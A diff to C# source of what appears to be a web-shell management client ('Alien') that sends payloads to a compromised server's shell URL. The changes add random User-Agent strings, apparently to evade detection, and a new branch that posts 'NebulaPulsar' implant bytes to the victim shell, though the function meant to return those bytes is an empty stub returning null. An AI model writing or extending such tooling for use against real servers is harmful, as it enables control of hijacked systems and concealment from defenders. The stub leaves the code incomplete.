@@ -271,6 +271,9 @@ namespace Alien
                 BaseAddress = new Uri(m_victim.ShellURL),
                 Timeout = TimeSpan.FromMilliseconds(5000),
             };
+
+            string szRandomUA = clsEzData.fnRandomUserAgent();
+            m_clnt.DefaultRequestHeaders.UserAgent.ParseAdd(szRandomUA);
         }
 
         private static readonly JsonSerializerOptions s_jsonOpts = new()
@@ -393,7 +396,7 @@ namespace Alien
         /// <returns></returns>
         public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
         {
-            StringContent content;
+            HttpContent? content = null;
             HttpResponseMessage resp;
             string szRespContent = string.Empty;
 
@@ -510,8 +513,23 @@ namespace Alien
                         "application/json"
                     );
                 }
+                else if (m_victim.ShellPayloadType == enPayloadType.NebulaPulsar)
+                {
+                    byte[]? abImplant = fnGetNebulaPulsar();
+                    if (abImplant == null)
+                        throw new Exception("NebulaPulsar bytes data is null.");
+
+                    content = new ByteArrayContent(abImplant);
+                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded")
+                    {
+                        CharSet = "; charset=" + m_victim.ShellEncoding,
+                    };
+
+
+                }
                 else
                 {
+                    // OneShell
                     content = new StringContent(
                         szPayloadData,
                         Encoding.GetEncoding(m_victim.ShellEncoding),
@@ -827,6 +845,13 @@ namespace Alien
                 MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return string.Empty;
             }
+        }
+
+        private byte[]? fnGetNebulaPulsar()
+        {
+
+
+            return null;
         }
 
         private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
